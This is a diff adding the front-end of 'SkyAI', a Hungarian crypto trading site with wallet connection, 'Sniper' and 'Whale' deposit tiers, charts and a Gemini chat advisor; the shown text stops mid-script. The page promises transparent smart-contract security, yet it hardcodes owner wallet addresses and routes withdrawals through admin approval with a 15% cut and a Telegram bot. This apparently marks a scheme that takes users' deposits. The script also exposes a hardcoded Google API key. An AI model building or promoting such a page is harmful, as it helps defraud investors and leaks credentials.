@@ -1,0 +1,1477 @@
+<!DOCTYPE html>
+
+<html lang="hu">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>SkyAI | Professional Trading Ecosystem</title>
+
+    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;600;700&family=Rajdhani:wght@500;600;700;800&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+   
+
+    <!-- Web3 & Chart Libs -->
+
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
+
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+
+    <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
+
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+
+    <!-- Markdown Parser for AI responses -->
+
+    <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+
+
+
+    <style>
+
+        :root {
+
+            --bg: #030304;
+
+            --panel: #0b0b0f;
+
+            --panel-border: 1px solid rgba(255,255,255,0.08);
+
+           
+
+            --cyan: #00f0ff;
+
+            --cyan-glow: 0 0 20px rgba(0, 240, 255, 0.15);
+
+           
+
+            --gold: #d4af37;
+
+            --gold-glow: 0 0 20px rgba(212, 175, 55, 0.15);
+
+           
+
+            --danger: #ff2a51;
+
+            --success: #00ff9d;
+
+            --text: #ffffff;
+
+            --text-muted: #8b9bb4;
+
+           
+
+            --ai-purple: #a855f7;
+
+            --ai-glow: 0 0 20px rgba(168, 85, 247, 0.3);
+
+        }
+
+
+
+        * { box-sizing: border-box; margin: 0; padding: 0; scrollbar-width: thin; scrollbar-color: var(--cyan) var(--bg); }
+
+
+
+        body {
+
+            background-color: var(--bg);
+
+            background-image: radial-gradient(circle at 50% 0%, rgba(0, 240, 255, 0.03) 0%, transparent 50%);
+
+            color: var(--text);
+
+            font-family: 'Space Grotesk', sans-serif;
+
+            min-height: 100vh;
+
+            display: flex;
+
+            flex-direction: column;
+
+            overflow-x: hidden;
+
+        }
+
+
+
+        /* --- NAVIGATION --- */
+
+        nav {
+
+            display: flex;
+
+            justify-content: space-between;
+
+            align-items: center;
+
+            padding: 15px 40px;
+
+            background: rgba(3,3,4,0.9);
+
+            border-bottom: var(--panel-border);
+
+            position: sticky;
+
+            top: 0;
+
+            z-index: 1000;
+
+            backdrop-filter: blur(12px);
+
+        }
+
+
+
+        .brand { font-family: 'Rajdhani', sans-serif; font-size: 1.8rem; font-weight: 800; display: flex; align-items: center; gap: 8px; cursor: pointer; letter-spacing: 1px; }
+
+        .brand span { color: var(--cyan); text-shadow: var(--cyan-glow); }
+
+        .brand.whale-mode span { color: var(--gold); text-shadow: var(--gold-glow); }
+
+
+
+        .menu { display: flex; gap: 30px; }
+
+        .menu-item {
+
+            background: transparent; border: none; color: var(--text-muted);
+
+            font-family: 'Space Grotesk'; font-size: 0.9rem; font-weight: 600; text-transform: uppercase;
+
+            cursor: pointer; transition: 0.3s; position: relative; padding: 5px 0; letter-spacing: 0.5px;
+
+        }
+
+        .menu-item:hover, .menu-item.active { color: #fff; }
+
+        .menu-item.active::after {
+
+            content: ''; position: absolute; bottom: -5px; left: 0; width: 100%; height: 2px;
+
+            background: var(--cyan); box-shadow: var(--cyan-glow);
+
+        }
+
+        .menu-item.whale-active.active::after { background: var(--gold); box-shadow: var(--gold-glow); }
+
+       
+
+        .menu-item.ai-active { color: var(--ai-purple); }
+
+        .menu-item.ai-active.active::after { background: var(--ai-purple); box-shadow: var(--ai-glow); }
+
+
+
+        .nav-actions { display: flex; align-items: center; gap: 15px; }
+
+
+
+        .btn-connect {
+
+            padding: 10px 24px; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.2);
+
+            color: #fff; border-radius: 4px; cursor: pointer; font-weight: 600; font-family: 'Rajdhani';
+
+            transition: 0.3s; display: flex; align-items: center; gap: 8px; font-size: 1rem;
+
+        }
+
+        .btn-connect:hover { background: rgba(255,255,255,0.1); border-color: #fff; }
+
+        .btn-connect.connected { border-color: var(--success); color: var(--success); background: rgba(0,255,157,0.05); }
+
+
+
+        .btn-app {
+
+            padding: 10px 24px; background: linear-gradient(135deg, #0088cc 0%, #005f8f 100%); border: none;
+
+            color: #fff; border-radius: 4px; cursor: pointer; font-weight: 700; font-family: 'Rajdhani';
+
+            transition: 0.3s; display: flex; align-items: center; gap: 8px; text-decoration: none; font-size: 1rem;
+
+        }
+
+        .btn-app:hover { box-shadow: 0 0 20px rgba(0, 136, 204, 0.4); transform: translateY(-1px); }
+
+
+
+        /* --- SECTIONS --- */
+
+        .section { display: none; padding: 40px 20px; max-width: 1400px; margin: 0 auto; width: 100%; animation: fadeUp 0.6s cubic-bezier(0.16, 1, 0.3, 1); }
+
+        .section.active { display: block; }
+
+        @keyframes fadeUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+
+
+
+        /* --- UI COMPONENTS --- */
+
+        .grid-3 { display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 30px; margin-top: 40px; }
+
+       
+
+        .card {
+
+            background: var(--panel); border: var(--panel-border); padding: 30px; border-radius: 12px;
+
+            transition: 0.4s; position: relative; overflow: hidden;
+
+        }
+
+        .card:hover { transform: translateY(-5px); border-color: rgba(255,255,255,0.2); box-shadow: 0 10px 40px rgba(0,0,0,0.5); }
+
+       
+
+        .card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; padding-bottom: 15px; border-bottom: 1px solid rgba(255,255,255,0.05); }
+
+        .card h3 { font-family: 'Rajdhani'; font-weight: 700; font-size: 1.4rem; display: flex; align-items: center; gap: 10px; margin: 0; }
+
+
+
+        .sky-input {
+
+            width: 100%; background: #050507; border: 1px solid #333; color: #fff; padding: 15px;
+
+            border-radius: 6px; font-family: 'Space Grotesk'; font-size: 1rem; outline: none; transition: 0.3s;
+
+        }
+
+        .sky-input:focus { border-color: var(--cyan); }
+
+        .whale-mode .sky-input:focus { border-color: var(--gold); }
+
+
+
+        .btn-action {
+
+            width: 100%; padding: 15px; font-family: 'Rajdhani'; font-weight: 800; text-transform: uppercase; font-size: 1.1rem;
+
+            cursor: pointer; border: none; border-radius: 6px; transition: 0.3s;
+
+            display: flex; justify-content: center; align-items: center; gap: 10px;
+
+        }
+
+       
+
+        .btn-sniper { background: transparent; border: 1px solid var(--cyan); color: var(--cyan); }
+
+        .btn-sniper:hover { background: var(--cyan); color: #000; box-shadow: var(--cyan-glow); }
+
+       
+
+        .btn-whale { background: var(--gold); color: #000; }
+
+        .btn-whale:hover { background: #fff; box-shadow: var(--gold-glow); }
+
+
+
+        .btn-withdraw {
+
+            background: transparent; border: 1px solid var(--danger); color: var(--danger);
+
+        }
+
+        .btn-withdraw:hover { background: var(--danger); color: #000; box-shadow: 0 0 15px rgba(255, 42, 81, 0.4); }
+
+
+
+        .btn-ai {
+
+            background: linear-gradient(135deg, var(--ai-purple) 0%, #7c3aed 100%); color: white; border: none;
+
+            padding: 8px 16px; border-radius: 4px; font-weight: 600; cursor: pointer; font-family: 'Rajdhani';
+
+            display: flex; align-items: center; gap: 8px; font-size: 0.9rem; transition: 0.3s;
+
+        }
+
+        .btn-ai:hover { box-shadow: var(--ai-glow); transform: scale(1.05); }
+
+
+
+        /* --- HOME HERO --- */
+
+        .hero { text-align: center; padding: 80px 20px; }
+
+        .hero h1 { font-size: 4rem; margin-bottom: 20px; font-family: 'Rajdhani'; line-height: 1.1; font-weight: 800; }
+
+        .hero p { color: var(--text-muted); max-width: 700px; margin: 0 auto 50px; font-size: 1.2rem; line-height: 1.6; }
+
+       
+
+        .feature-box { background: rgba(255,255,255,0.02); padding: 20px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05); text-align: left; }
+
+        .feature-box i { font-size: 2rem; margin-bottom: 15px; display: block; }
+
+
+
+        /* --- MARKETS --- */
+
+        .market-table { width: 100%; border-collapse: collapse; }
+
+        .market-table th { text-align: left; padding: 20px; color: var(--text-muted); font-size: 0.8rem; border-bottom: 1px solid #333; text-transform: uppercase; }
+
+        .market-table td { padding: 20px; border-bottom: 1px solid rgba(255,255,255,0.03); font-family: 'Rajdhani'; font-size: 1.2rem; font-weight: 600; }
+
+        .market-row:hover { background: rgba(255,255,255,0.02); }
+
+
+
+        /* --- EDUCATION & PARTNERS --- */
+
+        .edu-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; }
+
+        .edu-card { background: #111; padding: 25px; border-radius: 8px; border: 1px solid #222; transition: 0.3s; cursor: pointer; text-decoration: none; color: #fff; display: block; position: relative; }
+
+        .edu-card:hover { border-color: var(--cyan); transform: translateY(-5px); }
+
+        .edu-card.featured { border-color: var(--gold); background: linear-gradient(145deg, rgba(212,175,55,0.05), #111); }
+
+        .edu-card.featured:hover { box-shadow: 0 0 20px rgba(212,175,55,0.2); }
+
+        .edu-logo { width: 40px; height: 40px; margin-bottom: 15px; object-fit: contain; }
+
+        .badge-new { position: absolute; top: 10px; right: 10px; background: var(--gold); color: #000; font-size: 0.7rem; font-weight: bold; padding: 2px 8px; border-radius: 4px; }
+
+
+
+        /* --- SNIPER SWITCH --- */
+
+        .sniper-switch {
+
+            display: flex; background: #1a1a20; border-radius: 6px; padding: 4px; margin-bottom: 20px; border: 1px solid #333;
+
+        }
+
+        .sniper-opt {
+
+            flex: 1; padding: 12px; text-align: center; cursor: pointer; border-radius: 4px; font-weight: 700; font-family: 'Rajdhani'; transition: 0.3s;
+
+            color: #666; font-size: 1.1rem;
+
+        }
+
+        .sniper-opt:hover { color: #fff; }
+
+        .sniper-opt.active { background: var(--cyan); color: #000; box-shadow: 0 0 15px rgba(0,240,255,0.3); }
+
+
+
+        /* --- MODALS --- */
+
+        .modal { position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index:2000; display:none; justify-content:center; align-items:center; backdrop-filter: blur(10px); }
+
+        .modal-box { background: #0e0e12; border: 1px solid var(--cyan); padding: 40px; width: 90%; max-width: 450px; text-align: center; border-radius: 16px; box-shadow: 0 0 50px rgba(0,0,0,0.8); }
+
+
+
+        /* AI Modal Specifics */
+
+        .ai-modal-box {
+
+            background: #0e0e12; border: 1px solid var(--ai-purple); padding: 0; width: 90%; max-width: 600px;
+
+            text-align: left; border-radius: 16px; box-shadow: 0 0 50px rgba(168, 85, 247, 0.2);
+
+            display: flex; flex-direction: column; height: 70vh;
+
+        }
+
+        .ai-header { padding: 20px; border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center; background: rgba(168, 85, 247, 0.1); }
+
+        .ai-content { flex: 1; padding: 20px; overflow-y: auto; font-size: 0.95rem; line-height: 1.6; color: #ddd; }
+
+        .ai-input-area { padding: 20px; border-top: 1px solid #333; display: flex; gap: 10px; }
+
+        .ai-message { margin-bottom: 15px; padding: 10px 15px; border-radius: 8px; max-width: 80%; }
+
+        .ai-message.user { background: #333; align-self: flex-end; margin-left: auto; }
+
+        .ai-message.bot { background: rgba(168, 85, 247, 0.1); border: 1px solid rgba(168, 85, 247, 0.3); }
+
+        .loading-dots:after { content: ' .'; animation: dots 1s steps(5, end) infinite; }
+
+        @keyframes dots { 0%, 20% { content: ' .'; } 40% { content: ' ..'; } 60% { content: ' ...'; } 80%, 100% { content: ''; } }
+
+
+
+        @media (max-width: 768px) {
+
+            nav { flex-direction: column; gap: 20px; padding: 20px; }
+
+            .menu { overflow-x: auto; width: 100%; justify-content: center; padding-bottom: 10px; }
+
+            .hero h1 { font-size: 2.5rem; }
+
+            .grid-3 { grid-template-columns: 1fr; }
+
+        }
+
+    </style>
+
+</head>
+
+<body>
+
+
+
+    <!-- WALLET MODAL -->
+
+    <div class="modal" id="walletModal">
+
+        <div class="modal-box">
+
+            <h3 style="font-family:'Rajdhani'; margin-bottom:30px; font-size:1.5rem;">CSATLAKOZTATÁS</h3>
+
+            <button onclick="connectWallet('SOL')" style="width:100%; padding:18px; margin-bottom:15px; background:#1a1a20; border:1px solid #333; color:#fff; cursor:pointer; display:flex; align-items:center; gap:15px; border-radius:8px; font-weight:600; transition:0.3s;">
+
+                <img src="https://cryptologos.cc/logos/solana-sol-logo.png" width="30"> Phantom (Solana)
+
+            </button>
+
+            <button onclick="connectWallet('BSC')" style="width:100%; padding:18px; background:#1a1a20; border:1px solid #333; color:#fff; cursor:pointer; display:flex; align-items:center; gap:15px; border-radius:8px; font-weight:600; transition:0.3s;">
+
+                <img src="https://cryptologos.cc/logos/bnb-bnb-logo.png" width="30"> Trust / MetaMask (BSC)
+
+            </button>
+
+            <div style="margin-top:30px; color:#666; cursor:pointer; font-size:0.9rem;" onclick="document.getElementById('walletModal').style.display='none'">BEZÁRÁS</div>
+
+        </div>
+
+    </div>
+
+
+
+    <!-- AI ADVISOR MODAL -->
+
+    <div class="modal" id="aiModal">
+
+        <div class="ai-modal-box">
+
+            <div class="ai-header">
+
+                <h3 style="margin:0; color:var(--ai-purple); display:flex; align-items:center; gap:10px;">
+
+                    <i class="fas fa-robot"></i> SkyAI Advisor
+
+                </h3>
+
+                <i class="fas fa-times" style="cursor:pointer; color:#888;" onclick="toggleAiModal(false)"></i>
+
+            </div>
+
+            <div class="ai-content" id="aiChatContent">
+
+                <div class="ai-message bot">
+
+                    Szia! A SkyAI intelligens asszisztense vagyok. Miben segíthetek a kereskedésben vagy a piaci elemzésben?
+
+                </div>
+
+            </div>
+
+            <div class="ai-input-area">
+
+                <input type="text" id="aiInput" class="sky-input" placeholder="Kérdezz valamit..." style="padding:10px; margin:0;" onkeypress="if(event.key==='Enter') sendAiMessage()">
+
+                <button onclick="sendAiMessage()" class="btn-ai" style="margin:0;"><i class="fas fa-paper-plane"></i></button>
+
+            </div>
+
+        </div>
+
+    </div>
+
+
+
+    <!-- NAVIGATION -->
+
+    <nav>
+
+        <div class="brand" id="brand" onclick="nav('home')">SkyAI <span>ECOSYSTEM</span></div>
+
+        <div class="menu">
+
+            <button class="menu-item active" onclick="nav('home')">KEZDŐLAP</button>
+
+            <button class="menu-item" onclick="nav('markets')">PIACOK (LIVE)</button>
+
+            <button class="menu-item" onclick="nav('education')">TUDÁSBÁZIS</button>
+
+            <button class="menu-item" onclick="nav('sniper')" style="color:var(--cyan)">🎯 SNIPER</button>
+
+            <button class="menu-item whale-trigger" onclick="nav('whale')" style="color:var(--gold)">🐋 WHALE</button>
+
+            <button class="menu-item ai-active" onclick="toggleAiModal(true)"><i class="fas fa-sparkles"></i> AI ADVISOR</button>
+
+        </div>
+
+       
+
+        <div class="nav-actions">
+
+            <a href="https://t.me/SkyAIBusinessBot" target="_blank" class="btn-app">
+
+                <i class="fab fa-telegram-plane"></i> APP
+
+            </a>
+
+            <button class="btn-connect" id="connectBtn" onclick="openModal()">
+
+                <i class="fas fa-wallet"></i> CONNECT
+
+            </button>
+
+        </div>
+
+    </nav>
+
+
+
+    <!-- 1. HOME -->
+
+    <section id="home" class="section active">
+
+        <div class="hero">
+
+            <div style="display:inline-block; padding:5px 15px; background:rgba(0,240,255,0.1); border:1px solid var(--cyan); border-radius:20px; font-size:0.8rem; color:var(--cyan); margin-bottom:20px; font-weight:bold;">
+
+                ● SYSTEM ONLINE v3.8 + POOOLSE
+
+            </div>
+
+            <h1>PROFESSZIONÁLIS<br><span style="color:var(--cyan)">WEB3 KERESKEDÉS</span></h1>
+
+            <p>
+
+                A SkyAI egy mesterséges intelligenciával támogatott kereskedési ökoszisztéma.
+
+                Valós adatok, okosszerződés alapú biztonság, Pooolse integráció és <strong>generatív AI elemzések</strong> egy helyen.
+
+            </p>
+
+           
+
+            <div style="display:flex; justify-content:center; gap:20px; flex-wrap:wrap;">
+
+                <button onclick="nav('sniper')" class="btn-action" style="width:auto; min-width:200px; background:transparent; border:1px solid var(--cyan); color:var(--cyan);">
+
+                    SNIPER BOT ($1-$100)
+
+                </button>
+
+                <button onclick="nav('whale')" class="btn-action" style="width:auto; min-width:200px; background:var(--gold); color:#000;">
+
+                    WHALE VAULT (>$100)
+
+                </button>
+
+            </div>
+
+        </div>
+
+
+
+        <div class="grid-3">
+
+            <div class="feature-box">
+
+                <i class="fas fa-brain" style="color:var(--ai-purple)"></i>
+
+                <h3>Gemini AI Integration</h3>
+
+                <p style="color:var(--text-muted); font-size:0.9rem; margin-top:10px;">
+
+                    A Google Gemini modellje valós időben elemzi a piaci adatokat és ad személyre szabott tanácsokat.
+
+                </p>
+
+            </div>
+
+            <div class="feature-box">
+
+                <i class="fas fa-lock" style="color:var(--gold)"></i>
+
+                <h3>Okosszerződés</h3>
+
+                <p style="color:var(--text-muted); font-size:0.9rem; margin-top:10px;">
+
+                    Minden tranzakció transzparens. A kifizetések jóváhagyása adminisztrált rendszeren keresztül történik.
+
+                </p>
+
+            </div>
+
+            <div class="feature-box">
+
+                <i class="fas fa-graduation-cap" style="color:#fff"></i>
+
+                <h3>Oktatás & Pooolse</h3>
+
+                <p style="color:var(--text-muted); font-size:0.9rem; margin-top:10px;">
+
+                    Ismerd meg a piacot a beépített TradingView, BlockchainBloom, Pooolse és Wallet útmutatóinkkal.
+
+                </p>
+
+            </div>
+
+        </div>
+
+    </section>
+
+
+
+    <!-- 2. MARKETS (LIVE API) -->
+
+    <section id="markets" class="section">
+
+        <div class="card-header">
+
+            <h2 style="font-family:'Rajdhani'; margin:0;">ÉLŐ ÁRFOLYAMOK</h2>
+
+            <div style="display:flex; align-items:center; gap:15px;">
+
+                <button class="btn-ai" onclick="generateMarketReport()">
+
+                    <i class="fas fa-magic"></i> ✨ AI GYORSELEMZÉS
+
+                </button>
+
+                <div style="font-size:0.9rem; color:var(--text-muted);"><i class="fas fa-bolt" style="color:#f3ba2f"></i> Binance API</div>
+
+            </div>
+
+        </div>
+
+       
+
+        <div class="card">
+
+            <!-- AI Report Container -->
+
+            <div id="ai-market-report" style="display:none; background:rgba(168, 85, 247, 0.1); border:1px solid var(--ai-purple); padding:20px; border-radius:8px; margin-bottom:20px;">
+
+                <h4 style="color:var(--ai-purple); margin-top:0;"><i class="fas fa-robot"></i> SkyAI Piaci Jelentés</h4>
+
+                <div id="ai-report-content" style="font-size:0.9rem; line-height:1.5; color:#ddd;">Elemzés generálása...</div>
+
+            </div>
+
+
+
+            <table class="market-table">
+
+                <thead>
+
+                    <tr>
+
+                        <th>Pár (USDC)</th>
+
+                        <th>Élő Ár</th>
+
+                        <th>24h Változás</th>
+
+                        <th>SkyAI Elemzés</th>
+
+                    </tr>
+
+                </thead>
+
+                <tbody id="live-signals-body">
+
+                    <tr><td colspan="4" style="text-align:center; padding:40px;">Adatok betöltése...</td></tr>
+
+                </tbody>
+
+            </table>
+
+        </div>
+
+
+
+        <div style="margin-top:30px; display:grid; grid-template-columns: 1fr 1fr; gap:30px;">
+
+            <div style="height:400px; border-radius:12px; overflow:hidden;">
+
+                <div id="tv-btc-main" style="height:100%;"></div>
+
+            </div>
+
+            <div style="height:400px; border-radius:12px; overflow:hidden;">
+
+                <div id="tv-sol-main" style="height:100%;"></div>
+
+            </div>
+
+        </div>
+
+    </section>
+
+
+
+    <!-- 3. EDUCATION & POOOLSE -->
+
+    <section id="education" class="section">
+
+        <h2 style="font-family:'Rajdhani'; margin-bottom:30px; border-bottom:1px solid #333; padding-bottom:15px;">SKYAI TUDÁSBÁZIS & PARTNEREK</h2>
+
+       
+
+        <div class="edu-grid">
+
+            <!-- POOOLSE CARD -->
+
+            <a href="https://app.pooolse.com/join/7974" target="_blank" class="edu-card featured">
+
+                <div class="badge-new">AJÁNLOTT</div>
+
+                <div style="font-family:'Rajdhani'; font-weight:800; font-size:1.5rem; color:var(--gold); margin-bottom:15px; letter-spacing:1px;">POOOLSE</div>
+
+                <h3>Pooolse Ecosystem</h3>
+
+                <p style="font-size:0.85rem; color:#ccc; margin-top:10px;">Magyar fejlesztésű közösségi kripto projekt. Építs passzív jövedelmet közösségi bányászattal.</p>
+
+                <div style="margin-top:15px; font-size:0.8rem; color:var(--gold); font-weight:bold;">CSATLAKOZÁS <i class="fas fa-arrow-right"></i></div>
+
+            </a>
+
+
+
+            <a href="https://hu.tradingview.com/" target="_blank" class="edu-card">
+
+                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b9/TradingView_Logo_Block.svg" class="edu-logo" style="width: 120px; height: auto;">
+
+                <h3>TradingView</h3>
+
+                <p style="font-size:0.85rem; color:#888; margin-top:10px;">A világ vezető elemző platformja. Tanuld meg a chartok olvasását.</p>
+
+            </a>
+
+            <a href="https://blockchainbloom.com/hu/" target="_blank" class="edu-card">
+
+                <div style="font-family:'Rajdhani'; font-weight:800; font-size:1.5rem; color:#00f0ff; margin-bottom:15px;">BB</div>
+
+                <h3>BlockchainBloom HU</h3>
+
+                <p style="font-size:0.85rem; color:#888; margin-top:10px;">Friss hírek, elemzések és kripto piaci körkép magyarul.</p>
+
+            </a>
+
+            <a href="https://trustwallet.com/" target="_blank" class="edu-card">
+
+                <img src="https://cryptologos.cc/logos/bnb-bnb-logo.png" class="edu-logo">
+
+                <h3>Trust Wallet</h3>
+
+                <p style="font-size:0.85rem; color:#888; margin-top:10px;">A legbiztonságosabb tárca a BNB Chain (BSC) használatához.</p>
+
+            </a>
+
+            <a href="https://phantom.app/" target="_blank" class="edu-card">
+
+                <img src="https://cryptologos.cc/logos/solana-sol-logo.png" class="edu-logo">
+
+                <h3>Phantom Wallet</h3>
+
+                <p style="font-size:0.85rem; color:#888; margin-top:10px;">A Solana ökoszisztéma alapköve. Gyors és felhasználóbarát.</p>
+
+            </a>
+
+        </div>
+
+    </section>
+
+
+
+    <!-- 4. SNIPER -->
+
+    <section id="sniper" class="section">
+
+        <div style="margin-bottom:30px;">
+
+            <h2 style="font-family:'Rajdhani'; font-size:2.5rem; margin:0;">SNIPER <span style="color:var(--cyan)">TERMINAL</span></h2>
+
+            <p style="color:var(--text-muted); margin-top:5px;">Mikro-tranzakciók ($1 - $100) | Gyors Végrehajtás</p>
+
+        </div>
+
+       
+
+        <div style="display:grid; grid-template-columns: 2fr 1fr; gap:30px;">
+
+            <div class="card" style="padding:0; min-height:500px; display:flex; flex-direction:column; border-color:var(--cyan);">
+
+                <div style="position:absolute; top:0; left:0; width:100%; height:2px; background:var(--cyan); box-shadow:0 0 10px var(--cyan);"></div>
+
+                <div id="tv-sniper-active" style="flex:1;"></div>
+
+            </div>
+
+
+
+            <div class="card">
+
+                <h3><i class="fas fa-sliders-h"></i> BEÁLLÍTÁS</h3>
+
+                <div style="padding:15px; background:rgba(255,255,255,0.03); border-radius:6px; margin:20px 0; font-size:0.85rem; color:#aaa;">
+
+                    <strong><i class="fas fa-info-circle"></i> Működés:</strong><br>
+
+                    A Sniper bot automatikusan figyeli a volatilitást. A "START" gombbal a tőkéd az okosszerződésbe kerül.
+
+                </div>
+
+               
+
+                <label style="font-size:0.8rem; color:#888; display:block; margin-bottom:8px;">ESZKÖZ VÁLASZTÁS</label>
+
+                <div class="sniper-switch">
+
+                    <div class="sniper-opt active" id="opt-sol" onclick="setSniperAsset('SOL')">SOL / USDC</div>
+
+                    <div class="sniper-opt" id="opt-bnb" onclick="setSniperAsset('BNB')">BNB / USDC</div>
+
+                </div>
+
+                <input type="hidden" id="sniper-asset" value="SOL">
+
+
+
+                <label style="font-size:0.8rem; color:#888; display:block; margin-bottom:8px;">BEFEKTETÉS (Max $100)</label>
+
+                <input type="number" id="sniper-amount" class="sky-input" placeholder="pl. 0.1" style="margin-bottom:20px;">
+
+
+
+                <div style="display:flex; gap:10px;">
+
+                    <button onclick="startStrategy('sniper')" class="btn-action btn-sniper" style="flex:1.5;">
+
+                        <i class="fas fa-crosshairs"></i> SNIPE INDÍTÁSA
+
+                    </button>
+
+                    <button onclick="requestWithdrawal('sniper')" class="btn-action btn-withdraw" style="flex:1;">
+
+                        <i class="fas fa-wallet"></i> KIFIZETÉS
+
+                    </button>
+
+                </div>
+
+
+
+                <div style="font-size:0.8rem; color:var(--text-muted); margin-top:15px; text-align:center;">
+
+                    Admin jóváhagyás szükséges (-15%)
+
+                </div>
+
+            </div>
+
+        </div>
+
+    </section>
+
+
+
+    <!-- 5. WHALE -->
+
+    <section id="whale" class="section">
+
+        <div style="margin-bottom:30px; display:flex; justify-content:space-between; align-items:flex-end;">
+
+            <div>
+
+                <h2 style="font-family:'Rajdhani'; font-size:2.5rem; margin:0; color:var(--gold);">WHALE <span style="color:#fff">VAULT</span></h2>
+
+                <p style="color:var(--text-muted); margin-top:5px;">Intézményi Kereskedés (>$100) | Tőkevédelem</p>
+
+            </div>
+
+            <div style="font-family:'Rajdhani'; color:var(--gold); border:1px solid var(--gold); padding:5px 15px; border-radius:4px;">VIP ACCESS</div>
+
+        </div>
+
+       
+
+        <div style="display:grid; grid-template-columns: 350px 1fr; gap:30px;">
+
+            <div class="card whale-ui">
+
+                <h3 style="color:var(--gold); margin-bottom:20px;">VAULT KONFIGURÁCIÓ</h3>
+
+               
+
+                <label style="font-size:0.8rem; color:#888; display:block; margin-bottom:8px;">KERESKEDÉSI PÁR</label>
+
+                <select class="sky-input" id="whale-pair" style="margin-bottom:20px;" onchange="loadWhaleChart()">
+
+                    <option value="BINANCE:BTCUSDC">Bitcoin (BTC)</option>
+
+                    <option value="BINANCE:SOLUSDC">Solana (SOL)</option>
+
+                    <option value="BINANCE:BNBUSDC">BNB Chain (BNB)</option>
+
+                </select>
+
+
+
+                <label style="font-size:0.8rem; color:#888; display:block; margin-bottom:8px;">BEFEKTETÉS (Min $100)</label>
+
+                <input type="number" id="whale-amount" class="sky-input" placeholder="pl. 1.5 BNB" style="margin-bottom:20px;">
+
+
+
+                <div style="font-size:0.8rem; color:#666; margin-bottom:20px; line-height:1.4;">
+
+                    A Whale Vault egy diverzifikált stratégiát használ. Az összeg zárolásra kerül a SkyAI szerződésben.
+
+                </div>
+
+
+
+                <button class="btn-action btn-whale" id="whale-start-btn" onclick="startStrategy('whale')">
+
+                    <i class="fas fa-lock"></i> START SMART CONTRACT
+
+                </button>
+
+
+
+                <div style="margin-top:20px; padding-top:20px; border-top:1px solid rgba(212,175,55,0.2);">
+
+                    <button class="btn-action" onclick="requestWithdrawal('whale')" style="background:var(--gold); color:#000; margin-top:0; font-size:1rem; width:100%;">
+
+                        <i class="fab fa-telegram-plane"></i> PRÉMIUM KIFIZETÉS
+
+                    </button>
+
+                </div>
+
+            </div>
+
+
+
+            <!-- Whale Chart Tabs -->
+
+            <div class="card" style="padding:0; overflow:hidden; display:flex; flex-direction:column;">
+
+                <div style="display:flex; background:#000; border-bottom:1px solid #333;">
+
+                    <button onclick="toggleWhaleChart('active')" style="flex:1; padding:15px; background:#111; color:#fff; border:none; cursor:pointer; border-right:1px solid #333;">KERESKEDETT PÁR</button>
+
+                    <button onclick="toggleWhaleChart('btc')" style="flex:1; padding:15px; background:#000; color:#888; border:none; cursor:pointer;">BTC PIACI TREND</button>
+
+                </div>
+
+                <div style="flex:1; position:relative;">
+
+                    <div id="tv-whale-active" style="position:absolute; top:0; left:0; width:100%; height:100%;"></div>
+
+                    <div id="tv-whale-btc" style="position:absolute; top:0; left:0; width:100%; height:100%; display:none;"></div>
+
+                </div>
+
+            </div>
+
+        </div>
+
+    </section>
+
+
+
+    <script>
+
+        // --- KONFIG ---
+
+        const OWNER_BSC = "0xC424c3119e5D1fA6dD91eF72aF25e1F4A260f69C";
+
+        const OWNER_SOL = "4iubzdpP14Mo32iRseD7nZEhP1RVLWjjwbsh228uBk3z";
+
+        const BOT_USERNAME = "SkyAIBusinessBot";
+
+        const apiKey = "AIzaSyBQdBJtfipjQp0FrhjjL0e8rASorng0ics"; // Environment handles this
+
+
+
+        let walletType = null;
+
+        let userAddress = null;
+
+        let provider, signer;
+
+        let activeInvestments = { sniper: 0, whale: 0 };
+
+        let activeCurrency = 'BNB';
+
+        let globalMarketData = [];
+
+
+
+        window.onload = () => { nav('home'); fetchBinanceData(); };
+
+
+
+        // --- GEMINI AI SERVICE ---
+
+        async function callGemini(promptText) {
+
+            try {
+
+                const response = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-09-2025:generateContent?key=${apiKey}`, {
+
+                    method: 'POST',
+
+                    headers: { 'Content-Type': 'application/json' },
+
+                    body: JSON.stringify({
+
+                        contents: [{ parts: [{ text: promptText }] }]
+
+                    })
+
+                });
+
+                if (!response.ok) throw new Error('API Error');
+
+                const data = await response.json();
+
+                return data.candidates[0].content.parts[0].text;
+
+            } catch (error) {
+
+                console.error("AI Error:", error);
+
+                return "Sajnálom, hiba történt a SkyAI szerverrel való kommunikációban. Próbáld újra később.";
+
+            }
+
+        }
+
+
+
+        // --- AI MARKET REPORT ---
+
+        async function generateMarketReport() {
+
+            if (globalMarketData.length === 0) {
+
+                alert("Kérlek várj, amíg betöltődnek a piaci adatok!");
+
+                return;
+
+            }
+
+            const reportContainer = document.getElementById('ai-market-report');
+
+            const reportContent = document.getElementById('ai-report-content');
+
+            reportContainer.style.display = 'block';
+
+            reportContent.innerHTML = '<span class="loading-dots">SkyAI Elemzés Generálása</span>';
+
+
+
+            let dataSummary = globalMarketData.map(d => `${d.symbol}: Ár $${d.price}, Változás ${d.change}%`).join('\n');
+
+            const prompt = `Tapasztalt kriptokereskedő elemző vagy (SkyAI). Itt vannak a jelenlegi piaci adatok:\n${dataSummary}\nÍrj egy rövid, lényegre törő, professzionális piaci elemzést magyar nyelven ezek alapján. Koncentrálj a trendekre és a volatilitásra. Használj emojikat. Ne használj bevezető szöveget, térj a lényegre.`;
+
+
+
+            const analysis = await callGemini(prompt);
+
+            reportContent.innerHTML = marked.parse(analysis);
+
+        }
+
+
